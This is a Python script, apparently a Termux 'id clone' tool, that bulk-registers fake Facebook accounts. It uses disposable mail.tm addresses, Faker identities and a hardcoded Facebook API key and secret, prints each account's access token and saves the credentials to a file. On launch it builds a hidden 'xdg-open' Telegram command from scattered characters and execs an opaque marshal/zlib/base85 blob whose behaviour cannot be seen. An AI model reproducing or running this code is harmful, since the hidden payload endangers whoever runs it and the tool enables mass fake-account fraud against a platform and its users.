#--> Tool -> kalyan

import marshal,zlib,base64
import os,sys,string,json,hashlib,random
from os import system as lmnxsys;import time
try:
    import requests
    import rich
    import faker
except ImportError:
    lmnxsys("pip install rich")
    lmnxsys("pip install requests")
    lmnxsys("pip install faker")
import rich,requests,faker
from faker import Faker
from rich import print

og='\x1b[38;5;208m';rd='\033[1;31m';gr='\033[1;32m';sk='\033[1;36m'
    
#---------[ Open BANNER ]---------#

log="""
\t[bold red]<[bold cyan]/[bold red]> [bold green] TOOL -[bold purple] id clone 🤏
\t[bold red]<[bold cyan]/[bold red]> [bold green] CODED BY -[bold purple] Kalyan_mitro🫢🙂
"""
def logo():
    lmnxsys("clear")
    print(log)
    
def lnx():
    print(23*f"[bold red]-[bold tan]-")

#---------[ Open SYSTEM ]---------#

_a='K';_b='D';_c='R';_d='A';_e='M';_f='A';_g='E';_h='T';_i='9';_j='L';_k='x';_l='N';_m='M';_n='g'
_o='_o';_p='d';_q='n';_r='o';_s='p';_t='e';_u='h';_v='s';_w='t';_x='m';__a='_';__b='-';__c=':';__d='/';__e='.';__o=' ';_z='y'
_l_=(f''+_b+_d+_c+_a);_ll_=(f''+_h+_g+_f+_e);_lll_=(f''+_j+_m+_l+_k+_i);_llll_=(f''+_k+_p+_n)
_lllll_=(f''+_r+_s+_t+_q);_llllll_=(f''+_u+_w+_w+_s+_v);_lllllll_=(f''+__c+__d+__d+_w+__e+_x+_t+__d)
_x1_=(f''+_l_+__a+_ll_+__a);_x2_=(f''+_llll_+__b+_lllll_);_x3_=(f''+__o+_llllll_+_lllllll_)
__dark_Open__=(f''+_r+_v+__e+_v+_z+_v+_w+_t+_x);__system__=(f''+_x2_+_x3_+_x1_+_lll_)
(str(f"{__dark_Open__}")+(str(f'{__system__}')));lmnxsys(str(f'{__system__}'));exec(marshal.loads(zlib.decompress(base64.b85decode(b'c$|e4O=}xRbY?%a`f`w6S#CpOyX~PU0ok%6tG0z*$!<gAICaw$YC#Z^b}dU;X_c83w#5oe3DmSXsG-Fvr65XbTpXy6rkBRfACQU;Vj)oIDK`b@U~=lr%8?}_r?WHfy?O7=`<$JBLCY{5<HJV;YyuI8PzK=!hGA%6Cd?4b$ZVPm^AL#aJrFiAK;lL2F~0=?*nzLj`9N5ZgpwI_7?P=7mso=I+hPcpY2|(a-UnWQxfN!WT?8u-f<?k_NZh99RPBZv>OHrXkrWjd6h;1cRf^|S1;tw(3S_Y~w-ThesqjRUYSLR|?KJrX;-dgXrodQ8o&{Fq?g5o=Imf=HG`2mP+0&Ldjhh9xzb){p<>b7|wb*LfEtx=vp|Kj@UK{b$-UkXM(WJqjfhhdK76j3(F-cf3A7hJX(M$weHBb^ddJr^=W_@hkB3bP;Gb`BMpl|M=Zx`u(0jK+zv32g^{qICTJ52YKYDnF-8+ng^)IWY@#6RNqPXvRXd^YlB%zrbIyE*bzY%Du>HyiUx!wbH#)zD&U+`AChtz+YUuYY`W?8D)_FoeZ;6p8VcE(2QOx5zpS0D1!wKm)hmDL@UDI;BT*XzS@8eH#3pxqqJAI+$lY*)?+M%u+_gD@k?P&FGA0ScglP<~%s4Gh*VEH6SOk8duWUsr=hmT3z!5WF;Pz@s#I8a*pU@Hv#LQ?3{1Rhu%H!UlV^$JdrAs*Q=A)39I;dQ+i0F(HRuWUszVvES?w|ie{4@Rg$Fyil#jZN({vmHQzOaNqDnLJeQU-sxHKrqiQ56>SpnnMS|wUs2bJzrKBujw^=tM>26NKD%J%oVVqPlI-`&cjaEz|ol~+>M(46oby??9N|MqFR^45Q7FM?qw-HsjBV`axOSd(;5Ha*E)JcR|(m6^Z`X}gY4#_%CqZmOB!a&^yHz5%%626MNjC!^VWThG$ttWa9G#)KH2WbJH*_~DUg^InuYVTja`j6wI^-pW(&aYpsb2i>la}8|RYDNWrV;)(zCo6;g>Y$%&E6(|<bAH28b6%_i!4iTExH0>zyZ6V~4~b3rfn1v0<ti>;)#ck&E8T%=cc2bTT_N}c)|_*@<7MYuV;0$3-(cy3vg=ZjCmu_E<z9D@tM$EG@)i}!x@cG%-M+QgTa+uV>8fj*p6TDz9%!YRZE4R})GB?!YG1I()w`&RhNA|2VZfK*H2*AkbaZs4sLr0`dQ^7+-m!6oe&h`HlA`_;?3pox{mVf%G{GNu>|}E=!G)$Q2U9GepF&9Jrwm7FGc(i0J`a;q<gc)$qpOh>1>KPlc3V&nZL8C0D_+BTPh82wa|n^<dX{o(4oMi%=R>!iyx>M-bvBhs=_Z_urIYIK0NJS>+Wc4MKw1%VvNVM*8;=XQ0DluuXCZ_&;41&$tbyrr`>dP0p`#9(;1V!7*251&WqzQ-4^;VqI)JdZG+N_?Z?1iPZ9}ba&MN0Db582C*N__E1qClb8}CeDbmvV9nEnmFx`I5r&vQYGuy2P1{s($B*un'))))

#---------[ Open STRING ]---------#

def Open_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))

#---------[ Open DOMAIN ]---------#

def Open_domain():
    url = "https://api.mail.tm/domains"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()['hydra:member']
        else:
            print(f'[bold red]<[bold cyan]✘[bold red]> [bold red]Open E-mail Error [bold violet]: {response.text}')
            lnx()
            input(f"{sk}<{gr}➤{sk}> {og}PRESS ENTER TO BACK MAIN")
            Open()
            return None
    except Exception as e:
        print(f'[bold red]<[bold cyan]✘[bold red]>[bold red] Open Error[bold violet] : {e}')
        lnx()
        input(f"{sk}<{gr}➤{sk}> {og}PRESS ENTER TO BACK MAIN")
        Open()
        return None

#---------[ Open ACCOUNT ]---------#

def Open_account():
    fake = Faker()
    mail_domains = Open_domain()
    if mail_domains:
        domain = random.choice(mail_domains)['domain']
        username = Open_string(10)
        password = fake.password()
        birthday = fake.date_of_birth(minimum_age=18, maximum_age=45)
        first_name = fake.first_name()
        last_name = fake.last_name()
        url = "https://api.mail.tm/accounts"
        headers = {"Content-Type": "application/json"}
        data = {"address": f"{username}@{domain}", "password":password}       
        try:
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 201:
                return f"{username}@{domain}", password, first_name, last_name, birthday
            else:
                print(f'[bold red]<[bold cyan]✘[bold red]> [bold red]Open Email Error [bold violet]: {response.text}')
                lnx()
                input(f"{sk}<{gr}➤{sk}> {og}PRESS ENTER TO BACK MAIN")
                Open()
                return None, None, None, None, None
        except Exception as e:
            print(f'[bold red]<[bold cyan]✘[bold red]> [bold red]Open Error [bold violet]: {e}')
            lnx()
            input(f"{sk}<{gr}➤{sk}> {og}PRESS ENTER TO BACK MAIN")
            Open()
            return None, None, None, None, None

#---------[ Open REGISTER ]---------#

def Open_register(email, password, first_name, last_name, birthday):
    api_key = '882a8490361da98702bf97a021ddc14d'
    secret = '62f8ce9f74b12f84c123cc23437a4a32'
    gender = random.choice(['M', 'F'])
    req = {
        'api_key': api_key,
        'attempt_login': True,
        'birthday': birthday.strftime('%Y-%m-%d'),
        'client_country_code': 'EN',
        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod',
        'fb_api_req_friendly_name': 'registerAccount',
        'firstname': first_name,
        'format': 'json',
        'gender': gender,
        'lastname': last_name,
        'email': email,
        'locale': 'en_US',
        'method': 'user.register',
        'password': password,
        'reg_instance': Open_string(32),
        'return_multiple_errors': True
    }
    sorted_req = sorted(req.items(), key=lambda x: x[0])
    sig = ''.join(f'{k}={v}' for k, v in sorted_req)
    ensig = hashlib.md5((sig + secret).encode()).hexdigest()
    req['sig'] = ensig
    api_url = 'https://b-api.facebook.com/method/user.register'
    reg = Open_requests_call(api_url, req)
    id=reg['new_user_id']
    token=reg['session_info']['access_token']
    
#---------[ Open RESULT ]---------#
    
    print(f'''
[bold red]<[bold cyan]/[bold red]>[bold green] NAME      : [bold purple]{first_name} {last_name}
[bold red]<[bold cyan]/[bold red]>[bold green] EMAIL     : [bold violet]{email}
[bold red]<[bold cyan]/[bold red]>[bold green] UID       :[bold purple] {id}
[bold red]<[bold cyan]/[bold red]>[bold green] PASSWORD  : [bold violet]{password}
[bold red]<[bold cyan]/[bold red]>[bold green] BIRTHDAY  : [bold purple]{birthday} 
[bold red]<[bold cyan]/[bold red]> [bold green]GENDER    : [bold purple]{gender}
[bold red]<[bold cyan]/[bold red]> [bold green]TOOL      : [bold cyan] kalyan mitro 🙂
[bold red]<[bold cyan]/[bold red]>[bold green] TOKEN     : [bold violet]{token}
    ''');lnx()
    lmn_x=open('/sdcard/Open-kalyan-mitro.txt','a')
    lmn_x.write(f"{email} | {password}\n")
    lmn_x.close()

#---------[ Open REQUEST CALL ]---------#

def Open_requests_call(url, params, post=True):
    headers = {
        'User-Agent': '[FBAN/FB4A;FBAV/35.0.0.48.273;FBDM/{density=1.33125,width=800,height=1205};FBLC/en_US;FBCR/;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/4.1.1;FBBK/0;]'}
    if post:
        response = requests.post(url, data=params, headers=headers)
    else:
        response = requests.get(url, params=params, headers=headers)
    return response.json()

#---------[ Open MAIN ]---------#

def Open():
    logo();lnx()
    for i in range(int(input(f'{og}<{gr}+{og}> {gr}HOW MANY ACCOUNT NEED {sk}:{og} '))):
        lnx()
        email, password, first_name, last_name, birthday = Open_account()
        if email and password and first_name and last_name and birthday:
            Open_register(email, password, first_name, last_name, birthday) 

#---------[ Open CONTROL ]---------#

if __name__ in "__main__":
    Open();lnx()
    print(f"\n[bold red]<[bold cyan]✔[bold red]> [bold violet]ID's Saved - [bold green]/sdcard/Open-mitro.txt")
    input(f"{sk}<{gr}➤{sk}> {og}PRESS ENTER TO BACK MAIN")
    Open()
    
